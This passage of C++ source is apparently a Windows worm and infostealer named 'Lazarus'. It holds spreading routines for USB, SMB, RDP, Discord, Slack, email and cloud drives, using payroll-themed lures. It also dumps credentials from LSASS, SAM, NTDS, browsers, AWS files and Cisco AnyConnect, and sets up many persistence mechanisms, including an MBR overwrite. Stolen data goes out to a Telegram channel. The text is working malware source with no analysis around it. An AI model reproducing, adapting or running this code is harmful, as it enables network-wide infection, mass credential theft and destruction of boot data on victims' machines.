        std::string root = std::string(1, drive) + ":\\";
        if (GetDriveTypeA(root.c_str()) == DRIVE_REMOVABLE) {
            std::string dst = root + "svch0st.exe";
            CopyFileA(src.c_str(), dst.c_str(), FALSE);
            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            SendToTelegram("USB_PROPAGATED|" + std::string(1, drive));
        }
    }
}
static std::string GetLocalIP() {
    char hostname[256] = {0};
    gethostname(hostname, sizeof(hostname));
    struct addrinfo hints = {0}, *result = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(hostname, nullptr, &hints, &result) != 0) return "";
    char ip[INET_ADDRSTRLEN] = {0};
    sockaddr_in* sockaddr_ipv4 = (sockaddr_in*)result->ai_addr;
    inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip, INET_ADDRSTRLEN);
    freeaddrinfo(result);
    return std::string(ip);
}
static bool IsPortOpen(const std::string& ip, int port, int timeoutMs) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return false;
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);
    sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    connect(sock, (sockaddr*)&addr, sizeof(addr));
    fd_set fdWrite = {0}; FD_ZERO(&fdWrite); FD_SET(sock, &fdWrite);
    timeval tv = { timeoutMs / 1000, (timeoutMs % 1000) * 1000 };
    int selectResult = select(0, nullptr, &fdWrite, nullptr, &tv);
    bool open = (selectResult == 1);
    closesocket(sock);
    return open;
}
static bool CopyAndExecuteUsingCreds(const std::string& targetIP, const std::string& username, const std::string& password) {
    std::string remotePath = "\\\\" + targetIP + "\\C$\\svch0st.exe";
    std::string src = GetTempDir() + "svch0st.exe";
    if (!FileExists(src)) {
        CopyFileA(g_selfPath.c_str(), src.c_str(), FALSE);
        SetFileAttributesA(src.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    NETRESOURCEA nr = {0};
    nr.dwType = RESOURCETYPE_DISK;
    std::string share = "\\\\" + targetIP + "\\ADMIN$";
    nr.lpRemoteName = (LPSTR)share.c_str();
    DWORD result = WNetAddConnection2A(&nr, password.c_str(), username.c_str(), CONNECT_TEMPORARY);
    if (result != NO_ERROR) return false;
    if (!CopyFileA(src.c_str(), remotePath.c_str(), FALSE)) {
        WNetCancelConnection2A(share.c_str(), 0, TRUE);
        return false;
    }
    SetFileAttributesA(remotePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    std::string cmd = "schtasks /create /tn \"LazarusWorm\" /tr \"" + remotePath + "\" /sc onlogon /s " + targetIP + " /ru SYSTEM /f";
    int ret = system(cmd.c_str());
    if (ret != 0) {
        cmd = "wmic /node:\"" + targetIP + "\" /user:\"" + username + "\" /password:\"" + password + "\" process call create \"" + remotePath + "\"";
        system(cmd.c_str());
    }
    WNetCancelConnection2A(share.c_str(), 0, TRUE);
    return true;
}
static void SMBPropagation() {
    SendToTelegram("SMB_SCAN_STARTED");
    std::string localIP = GetLocalIP();
    if (localIP.empty()) return;
    size_t lastDot = localIP.find_last_of('.');
    if (lastDot == std::string::npos) return;
    std::string subnet = localIP.substr(0, lastDot + 1);
    std::vector<std::pair<std::string, std::string>> creds = { {"Administrator",""}, {"admin",""} };
    char user[256] = {0}; DWORD userSize = sizeof(user); GetUserNameA(user, &userSize);
    creds.push_back({user, ""});
    for (int i = 1; i < 255; ++i) {
        std::string ip = subnet + std::to_string(i);
        if (ip == localIP) continue;
        if (IsPortOpen(ip, 445, 200)) {
            for (const auto& cred : creds) {
                if (CopyAndExecuteUsingCreds(ip, cred.first, cred.second)) {
                    SendToTelegram("SMB_PROPAGATED|" + ip + "|" + cred.first);
                    break;
                }
            }
        }
    }
    SendToTelegram("SMB_SCAN_FINISHED");
}
static void RDPScanAndPropagation() {
    SendToTelegram("RDP_SCAN_STARTED");
    std::string localIP = GetLocalIP();
    if (localIP.empty()) return;
    size_t lastDot = localIP.find_last_of('.');
    if (lastDot == std::string::npos) return;
    std::string subnet = localIP.substr(0, lastDot + 1);
    std::vector<std::pair<std::string, std::string>> creds;
    for (const auto& cred : g_stolenCredentials) {
        size_t pos = cred.find('|');
        if (pos != std::string::npos) creds.push_back({cred.substr(0, pos), cred.substr(pos + 1)});
    }
    creds.push_back({"Administrator",""}); creds.push_back({"admin",""});
    char user[256] = {0}; DWORD userSize = sizeof(user); GetUserNameA(user, &userSize);
    creds.push_back({user, ""});
    for (int i = 1; i < 255; ++i) {
        std::string ip = subnet + std::to_string(i);
        if (ip == localIP) continue;
        if (IsPortOpen(ip, 3389, 500)) {
            for (const auto& cred : creds) {
                std::string remotePath = "\\\\" + ip + "\\C$\\svch0st_rdp.exe";
                std::string src = GetTempDir() + "svch0st.exe";
                if (!FileExists(src)) {
                    CopyFileA(g_selfPath.c_str(), src.c_str(), FALSE);
                    SetFileAttributesA(src.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                }
                bool copySuccess = false;
                if (!cred.first.empty() || !cred.second.empty()) {
                    NETRESOURCEA nr = {0}; nr.dwType = RESOURCETYPE_DISK;
                    std::string share = "\\\\" + ip + "\\ADMIN$";
                    nr.lpRemoteName = (LPSTR)share.c_str();
                    if (WNetAddConnection2A(&nr, cred.second.c_str(), cred.first.c_str(), CONNECT_TEMPORARY) == NO_ERROR) {
                        if (CopyFileA(src.c_str(), remotePath.c_str(), FALSE)) { copySuccess = true; SetFileAttributesA(remotePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); }
                        WNetCancelConnection2A(share.c_str(), 0, TRUE);
                    }
                }
                if (!copySuccess) {
                    NETRESOURCEA nr = {0}; nr.dwType = RESOURCETYPE_DISK;
                    std::string share = "\\\\" + ip + "\\ADMIN$";
                    nr.lpRemoteName = (LPSTR)share.c_str();
                    if (WNetAddConnection2A(&nr, "", "", 0) == NO_ERROR) {
                        CopyFileA(src.c_str(), remotePath.c_str(), FALSE);
                        SetFileAttributesA(remotePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        WNetCancelConnection2A(share.c_str(), 0, TRUE);
                    }
                }
                std::string taskCmd = "schtasks /create /tn \"LazarusRDP\" /tr \"" + remotePath + "\" /sc onlogon /s " + ip;
                if (!cred.first.empty()) taskCmd += " /u " + cred.first + " /p " + cred.second;
                taskCmd += " /f >nul 2>&1";
                system(taskCmd.c_str());
                SendToTelegram("RDP_PROPAGATED|" + ip + "|" + cred.first);
            }
        }
    }
    SendToTelegram("RDP_SCAN_FINISHED");
}
static void DiscordPropagation() {
    std::string appData = getenv("APPDATA");
    std::string ldbPath = appData + "\\discord\\Local Storage\\leveldb";
    WIN32_FIND_DATAA fd = {0};
    HANDLE hFind = FindFirstFileA((ldbPath + "\\*.ldb").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string fullPath = ldbPath + "\\" + fd.cFileName;
            std::ifstream in(fullPath, std::ios::binary);
            std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
            in.close();
            size_t tokenPos = content.find("\"token\"");
            if (tokenPos != std::string::npos) {
                size_t start = content.find("\"", tokenPos + 8);
                if (start != std::string::npos) {
                    size_t end = content.find("\"", start + 1);
                    if (end != std::string::npos) {
                        std::string token = content.substr(start + 1, end - start - 1);
                        SendToTelegram("DISCORD_TOKEN|" + token);
                        std::string msg = "{\"content\":\"⚠️ URGENT: Please review your payroll update: " + std::string(UPDATE_URL) + "\"}";
                        HINTERNET hSession = WinHttpOpen(L"Discord", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
                        if (hSession) {
                            HINTERNET hConnect = WinHttpOpenRequest(hSession, L"POST", L"https://discord.com/api/v9/channels/@me/messages", nullptr, nullptr, nullptr, 0);
                            if (hConnect) {
                                std::wstring headers = L"Content-Type: application/json\r\nAuthorization: " + std::wstring(token.begin(), token.end());
                                std::wstring wMsg = std::wstring(msg.begin(), msg.end());
                                WinHttpSendRequest(hConnect, headers.c_str(), (DWORD)headers.length(), (LPVOID)wMsg.c_str(), (DWORD)wMsg.size() * 2, (DWORD)wMsg.size() * 2, 0);
                                WinHttpReceiveResponse(hConnect, nullptr);
                                WinHttpCloseHandle(hConnect);
                            }
                            WinHttpCloseHandle(hSession);
                        }
                    }
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
}
static void SlackPropagation() {
    std::string appData = getenv("APPDATA");
    std::string jsonPath = appData + "\\Slack\\storage";
    WIN32_FIND_DATAA fd = {0};
    HANDLE hFind = FindFirstFileA((jsonPath + "\\*.json").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string fullPath = jsonPath + "\\" + fd.cFileName;
            std::ifstream in(fullPath);
            std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
            in.close();
            size_t tokenPos = content.find("\"token\":\"");
            if (tokenPos != std::string::npos) {
                size_t start = tokenPos + 9;
                size_t end = content.find("\"", start);
                if (end != std::string::npos) {
                    std::string token = content.substr(start, end - start);
                    SendToTelegram("SLACK_TOKEN|" + token);
                    std::string postData = "text=⚠️ *URGENT* – Please review your payroll update: " + std::string(UPDATE_URL);
                    HINTERNET hSession = WinHttpOpen(L"Slack", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
                    if (hSession) {
                        HINTERNET hConnect = WinHttpOpenRequest(hSession, L"POST", L"https://slack.com/api/chat.postMessage", nullptr, nullptr, nullptr, 0);
                        if (hConnect) {
                            std::wstring wAuth = L"Bearer " + std::wstring(token.begin(), token.end());
                            WinHttpAddRequestHeaders(hConnect, wAuth.c_str(), (DWORD)wAuth.length(), WINHTTP_ADDREQ_FLAG_ADD);
                            WinHttpAddRequestHeaders(hConnect, L"Content-Type: application/x-www-form-urlencoded", -1, WINHTTP_ADDREQ_FLAG_ADD);
                            std::wstring wData = std::wstring(postData.begin(), postData.end());
                            WinHttpSendRequest(hConnect, nullptr, 0, (LPVOID)wData.c_str(), (DWORD)wData.size() * 2, (DWORD)wData.size() * 2, 0);
                            WinHttpReceiveResponse(hConnect, nullptr);
                            WinHttpCloseHandle(hConnect);
                        }
                        WinHttpCloseHandle(hSession);
                    }
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
}
static void EmailPropagation() {
    std::string psScript =
        "$smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 465);\n"
        "$smtp.EnableSsl = $true;\n"
        "$smtp.Credentials = New-Object Net.NetworkCredential('" + std::string(SMTP_USERNAME) + "', '" + std::string(SMTP_PASSWORD) + "');\n"
        "$msg = New-Object Net.Mail.MailMessage;\n"
        "$msg.From = 'hr@example.com';\n"
        "$msg.To.Add('victim@example.com');\n"
        "$msg.Subject = 'Important Payroll Notice';\n"
        "$msg.Body = 'Please review the attached document.';\n"
        "$attachment = New-Object Net.Mail.Attachment('" + g_selfPath + "');\n"
        "$msg.Attachments.Add($attachment);\n"
        "$smtp.Send($msg);\n"
        "$attachment.Dispose();";
    std::string psFile = GetTempDir() + "email.ps1";
    { std::ofstream f(psFile); f << psScript; }
    system(("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + psFile + "\"").c_str());
    remove(psFile.c_str());
    SendToTelegram("EMAIL_PROPAGATION_SENT");
}
static void CloudDrivePropagation() {
    std::string userProfile = getenv("USERPROFILE");
    std::vector<std::string> cloudFolders = { userProfile + "\\OneDrive\\", userProfile + "\\Dropbox\\", userProfile + "\\Google Drive\\", userProfile + "\\iCloud Drive\\" };
    std::string src = GetTempDir() + "svch0st.exe";
    if (!FileExists(src)) { CopyFileA(g_selfPath.c_str(), src.c_str(), FALSE); SetFileAttributesA(src.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); }
    for (auto& folder : cloudFolders) {
        if (FileExists(folder) || CreateDirectoryA(folder.c_str(), nullptr)) {
            std::string dst = folder + "svch0st.exe";
            CopyFileA(src.c_str(), dst.c_str(), FALSE);
            SetFileAttributesA(dst.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            SendToTelegram("CLOUD_PROPAGATED|" + folder);
        }
    }
}

// ------------------------------------------------------------------
// Credential theft (full)
// ------------------------------------------------------------------
static void DumpLSASS() {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do { if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; } } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    if (pid == 0) return;
    std::string dumpPath = GetTempDir() + "lsass.dmp";
    system(("rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump " + std::to_string(pid) + " " + dumpPath + " full").c_str());
    JitterSleep(3000);
    if (FileExists(dumpPath)) {
        std::ifstream in(dumpPath, std::ios::binary);
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        SendToTelegramChunked("LSASS_DUMP|" + EncodeBase64(data));
        remove(dumpPath.c_str());
    }
}
static void DumpSAM() {
    std::string cmd = "vssadmin create shadow /for=C: > " + GetTempDir() + "vss.out 2>&1";
    system(cmd.c_str());
    JitterSleep(2000);
    std::ifstream vssFile(GetTempDir() + "vss.out");
    std::string line, shadowVolume;
    while (getline(vssFile, line)) {
        if (line.find("Shadow Copy Volume Name:") != std::string::npos) {
            shadowVolume = line.substr(line.find(':') + 2);
            break;
        }
    }
    vssFile.close();
    if (shadowVolume.empty()) return;
    cmd = "mklink /d C:\\shadowcopy \"" + shadowVolume + "\"";
    system(cmd.c_str());
    JitterSleep(2000);
    cmd = std::string("copy C:\\shadowcopy\\Windows\\System32\\config\\SAM ") + GetTempDir() + "SAM";
    system(cmd.c_str());
    cmd = std::string("copy C:\\shadowcopy\\Windows\\System32\\config\\SECURITY ") + GetTempDir() + "SECURITY";
    system(cmd.c_str());
    JitterSleep(3000);
    system("rmdir C:\\shadowcopy");
    system("vssadmin delete shadows /all /quiet");
    if (FileExists(GetTempDir() + "SAM")) {
        std::ifstream in(GetTempDir() + "SAM", std::ios::binary);
        std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        SendToTelegramChunked("SAM|" + EncodeBase64(data));
        remove((GetTempDir() + "SAM").c_str());
        remove((GetTempDir() + "SECURITY").c_str());
    }
}
static void StealBrowserData() {
    std::string localAppData = getenv("LOCALAPPDATA");
    std::string appData = getenv("APPDATA");
    std::vector<std::string> browsers = { localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data" };
    for (auto& b : browsers) {
        if (FileExists(b)) {
            std::string tempCopy = GetTempDir() + "logins.db";
            CopyFileA(b.c_str(), tempCopy.c_str(), FALSE);
            std::string psScript = "$db = '" + tempCopy + "'; Add-Type -Path 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\System.Data.SQLite.dll' -ErrorAction SilentlyContinue; if (Get-Command System.Data.SQLite.SQLiteConnection -ErrorAction SilentlyContinue) { $conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=$db'); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'; $reader = $cmd.ExecuteReader(); $results = @(); while ($reader.Read()) { $enc = [byte[]]$reader['password_value']; if ($enc.Length -gt 0) { try { $dec = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)); $results += $reader['origin_url'] + '|' + $reader['username_value'] + '|' + $dec } catch { $results += $reader['origin_url'] + '|' + $reader['username_value'] + '|' + 'DECRYPT_FAILED' } } else { $results += $reader['origin_url'] + '|' + $reader['username_value'] + '|' + 'NO_PASSWORD' } }; $conn.Close(); $results -join '`n' } else { Write-Output 'NO_SQLITE' }";
            std::string psFile = GetTempDir() + "decrypt.ps1";
            { std::ofstream f(psFile); f << psScript; }
            std::string outFile = GetTempDir() + "logins.txt";
            system(("powershell -ep bypass -File \"" + psFile + "\" > \"" + outFile + "\"").c_str());
            JitterSleep(5000);
            if (FileExists(outFile)) {
                std::ifstream in(outFile);
                std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
                if (content != "NO_SQLITE") SendToTelegramChunked("BROWSER_LOGINS|" + content);
                remove(outFile.c_str());
            }
            remove(psFile.c_str());
            remove(tempCopy.c_str());
        }
    }
    std::string ffProfiles = appData + "\\Mozilla\\Firefox\\Profiles";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA((ffProfiles + "\\*").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && strcmp(fd.cFileName, ".") && strcmp(fd.cFileName, "..")) {
                std::string subPath = ffProfiles + "\\" + fd.cFileName;
                if (FileExists(subPath + "\\logins.json")) {
                    std::ifstream in(subPath + "\\logins.json", std::ios::binary);
                    std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
                    SendToTelegramChunked("FIREFOX_LOGINS|" + std::string(fd.cFileName) + "|" + EncodeBase64(data));
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
}
static void StealCloudTokens() {
    std::string userProfile = getenv("USERPROFILE");
    std::string awsCreds = userProfile + "\\.aws\\credentials";
    if (FileExists(awsCreds)) {
        std::ifstream in(awsCreds);
        std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        SendToTelegramChunked("CLOUD_AWS|" + content);
    }
}
static void StealOAuthTokens() {
    std::string psScript = "$creds = @(); Get-StoredCredential | ForEach-Object { $creds += $_.UserName + '|' + $_.Password }; $creds -join '`n'";
    std::string psFile = GetTempDir() + "creds.ps1";
    { std::ofstream f(psFile); f << psScript; }
    system(("powershell -ep bypass -File \"" + psFile + "\" > \"" + GetTempDir() + "creds.txt\"").c_str());
    JitterSleep(2000);
    if (FileExists(GetTempDir() + "creds.txt")) {
        std::ifstream in(GetTempDir() + "creds.txt");
        std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        if (!content.empty()) SendToTelegramChunked("OAUTH_CREDS|" + content);
        remove((GetTempDir() + "creds.txt").c_str());
    }
    remove(psFile.c_str());
}
static void CiscoAnyConnectHijack() {
    std::string progData = getenv("PROGRAMDATA");
    std::string anyconnectPath = progData + "\\Cisco\\Cisco AnyConnect Secure Mobility Client\\";
    if (!FileExists(anyconnectPath)) {
        SendToTelegram("CISCO|NOT_FOUND");
        return;
    }
    std::string prefFile = anyconnectPath + "preferences.xml";
    if (FileExists(prefFile)) {
        std::ifstream in(prefFile);
        std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        SendToTelegramChunked("CISCO_PREFERENCES|" + EncodeBase64(std::vector<BYTE>(content.begin(), content.end())));
    }
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA((anyconnectPath + "\\*user*.xml").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string fullPath = anyconnectPath + fd.cFileName;
            std::ifstream in(fullPath);
            std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
            SendToTelegramChunked("CISCO_PROFILE|" + std::string(fd.cFileName) + "|" + EncodeBase64(std::vector<BYTE>(content.begin(), content.end())));
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    SendToTelegram("CISCO_HIJACK|COMPLETED");
}
static void StealAllCredentials() {
    DumpLSASS(); DumpSAM(); StealBrowserData(); StealCloudTokens(); StealOAuthTokens(); CiscoAnyConnectHijack();
    SendToTelegram("CRED_THEFT_COMPLETE");
}

// ------------------------------------------------------------------
// Domain controller attack
// ------------------------------------------------------------------
static bool IsDomainController() {
    HKEY hKey = nullptr;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}
static void ExtractNTDSAndSYSTEM() {
    std::string cmd = "vssadmin create shadow /for=C: > " + GetTempDir() + "vss.out 2>&1";
    system(cmd.c_str());
    JitterSleep(2000);
    std::ifstream vssFile(GetTempDir() + "vss.out");
    std::string line, shadowVolume;
    while (getline(vssFile, line)) {
        if (line.find("Shadow Copy Volume Name:") != std::string::npos) {
            shadowVolume = line.substr(line.find(':') + 2);
            break;
        }
    }
    vssFile.close();
    if (shadowVolume.empty()) return;
    cmd = "mklink /d C:\\shadowcopy \"" + shadowVolume + "\"";
    system(cmd.c_str());
    JitterSleep(2000);
    cmd = "copy C:\\shadowcopy\\Windows\\NTDS\\ntds.dit " + GetTempDir() + "ntds.dit";
    system(cmd.c_str());
    cmd = "copy C:\\shadowcopy\\Windows\\System32\\config\\SYSTEM " + GetTempDir() + "SYSTEM";
    system(cmd.c_str());
    JitterSleep(5000);
    system("rmdir C:\\shadowcopy");
    system("vssadmin delete shadows /all /quiet");
}
static void ExtractHashesFromNTDS() {
    std::string ntdsPath = GetTempDir() + "ntds.dit";
    std::string systemPath = GetTempDir() + "SYSTEM";
    if (!FileExists(ntdsPath) || !FileExists(systemPath)) return;
    std::string psScript = "Import-Module ActiveDirectory -ErrorAction Stop; $hashes = Get-ADReplAccount -All -Server localhost | ForEach-Object { '{0}:{1}:{2}:{3}:::' -f $_.SamAccountName, $_.ObjectSid.Value.Split('-')[-1], $_.LMHash, $_.NTHash }; if ($hashes) { $hashes -join \"`n\" } else { Write-Output 'NO_HASHES' }";
    std::string psFile = GetTempDir() + "extract.ps1";
    { std::ofstream f(psFile); f << psScript; }
    std::string cmd = "powershell -ep bypass -File \"" + psFile + "\" > \"" + GetTempDir() + "hashes.txt\"";
    system(cmd.c_str());
    JitterSleep(3000);
    std::ifstream hashFile(GetTempDir() + "hashes.txt");
    std::string hashes((std::istreambuf_iterator<char>(hashFile)), std::istreambuf_iterator<char>());
    if (!hashes.empty() && hashes != "NO_HASHES") SendToTelegramChunked("NTDS_HASHES|" + hashes);
    remove((GetTempDir() + "ntds.dit").c_str());
    remove((GetTempDir() + "SYSTEM").c_str());
    remove(psFile.c_str());
    remove((GetTempDir() + "hashes.txt").c_str());
}

// ------------------------------------------------------------------
// Persistence (12 methods)
// ------------------------------------------------------------------
static void InstallPermanentCopy() {
    std::string hiddenPath = std::string(getenv("PROGRAMDATA")) + "\\Lazarus\\";
    CreateDirectoryA(hiddenPath.c_str(), nullptr);
    SetFileAttributesA(hiddenPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    std::string dest = hiddenPath + "Lazarus.exe";
    CopyFileA(g_selfPath.c_str(), dest.c_str(), FALSE);
    SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    g_selfPath = dest;
}
static void PersistRegistry() {
    HKEY hKey = nullptr;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
    RegSetValueExA(hKey, "WindowsUpdateCore", 0, REG_SZ, (const BYTE*)g_selfPath.c_str(), (DWORD)g_selfPath.size() + 1);
    RegCloseKey(hKey);
    if (IsUserAdmin()) {
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
        RegSetValueExA(hKey, "WindowsUpdateCore", 0, REG_SZ, (const BYTE*)g_selfPath.c_str(), (DWORD)g_selfPath.size() + 1);
        RegCloseKey(hKey);
    }
}
static void PersistScheduledTask() {
    system(("schtasks /create /tn \"Microsoft\\Windows\\Lazarus\\Beacon\" /tr \"" + g_selfPath + "\" /sc onlogon /f").c_str());
}
static void PersistCOMHijack() {
    HKEY hKey = nullptr;
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
    RegSetValueExA(hKey, nullptr, 0, REG_SZ, (const BYTE*)g_selfPath.c_str(), (DWORD)g_selfPath.size() + 1);
    RegCloseKey(hKey);
    RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(hKey);
}
static void PersistStartupFolder() {
    char startup[MAX_PATH] = {0};
    SHGetFolderPathA(nullptr, CSIDL_STARTUP, nullptr, 0, startup);
    std::string linkPath = std::string(startup) + "\\Lazarus.lnk";
    CopyFileA(g_selfPath.c_str(), linkPath.c_str(), FALSE);
}
static void PersistWMI() {
    std::string psScript = "$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name='LazarusFilter'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{Name='LazarusConsumer'; ExecutablePath='" + g_selfPath + "'}; $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$filter; Consumer=$consumer};";
    std::string psFile = GetTempDir() + "wmi.ps1";
    { std::ofstream f(psFile); f << psScript; }
    system(("powershell -ep bypass -File \"" + psFile + "\"").c_str());
    remove(psFile.c_str());
}
static void InstallMBRBootkit() {
    if (!IsUserAdmin()) return;
    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDisk == INVALID_HANDLE_VALUE) return;
    BYTE mbr[512] = {0};
    DWORD bytesRead = 0;
    if (ReadFile(hDisk, mbr, 512, &bytesRead, nullptr) && bytesRead == 512 && mbr[510] == 0x55 && mbr[511] == 0xAA) {
        SetFilePointer(hDisk, 0, nullptr, FILE_BEGIN);
        memset(mbr, 0, 512);
        const char* msg = "Lazarus Bootkit - System owned.";
        strcpy((char*)mbr, msg);
        mbr[510] = 0x55;
        mbr[511] = 0xAA;
        WriteFile(hDisk, mbr, 512, &bytesRead, nullptr);
        SendToTelegram("MBR_BOOTKIT|DEPLOYED");
    }
    CloseHandle(hDisk);
}
static void PersistViaUEFI() {
    if (!IsUserAdmin()) return;
    std::string data = "excel.exe \"" + g_selfPath + "\"";
    SetFirmwareEnvironmentVariableA("LazarusBoot", "{00000000-0000-0000-0000-000000000000}", (PVOID)data.c_str(), (DWORD)data.size());
    SendToTelegram("UEFI_PERSISTENCE|ATTEMPTED");
}
static void InstallXLSTARTPersistence() {
    char startupPath[MAX_PATH] = {0};
    GetEnvironmentVariableA("APPDATA", startupPath, MAX_PATH);
    std::string xlStart = std::string(startupPath) + "\\Microsoft\\Excel\\XLSTART\\";
    CreateDirectoryA(xlStart.c_str(), nullptr);
    std::string dest = xlStart + "personal.xlsb";
    if (!FileExists(dest)) {
        CopyFileA(g_selfPath.c_str(), dest.c_str(), FALSE);
        SetFileAttributesA(dest.c_str(), FILE_ATTRIBUTE_HIDDEN);
        SendToTelegram("XLSTART_PERSISTENCE|DEPLOYED");
    }
}
static void DeployShadowSentinel() {
    std::string vbsPath = GetTempDir() + "shadow_sentinel.vbs";
    std::ofstream vbs(vbsPath);
    vbs << "On Error Resume Next\nDo While True\n  Set xl = GetObject(, \"Excel.Application\")\n  If xl Is Nothing Then\n    Set s = CreateObject(\"WScript.Shell\")\n    s.Run \"excel.exe \\\"\" & \"" << g_selfPath << "\" & \"\\\"\", 0, False\n    WScript.Quit\n  End If\n  WScript.Sleep 5000\nLoop\n";
    vbs.close();
    system(("wscript //b \"" + vbsPath + "\"").c_str());
    SendToTelegram("SHADOW_SENTINEL|DEPLOYED");
}
static void PersistAll() {
    InstallPermanentCopy(); PersistRegistry(); PersistScheduledTask(); PersistCOMHijack();
    PersistStartupFolder(); PersistWMI(); InstallXLSTARTPersistence(); DeployShadowSentinel();
    if (IsUserAdmin()) { InstallMBRBootkit(); PersistViaUEFI(); }
}

// ------------------------------------------------------------------
// Chrome Remote Desktop + Miner + Process injection (APC)
// ------------------------------------------------------------------
static void EnableChromeRemoteDesktop() {
    std::string crdPath = std::string(getenv("ProgramFiles")) + "\\Google\\Chrome Remote Desktop\\chromoting.exe";
    if (!FileExists(crdPath)) {
        std::string installer = GetTempDir() + "chromoting-setup.exe";
        if (DownloadFile(CRD_DOWNLOAD_URL, installer)) {
            system(("\"" + installer + "\" /quiet").c_str());
            JitterSleep(5000);
        }
    }
    if (!FileExists(crdPath)) return;
    int pin = rand() % 1000000;
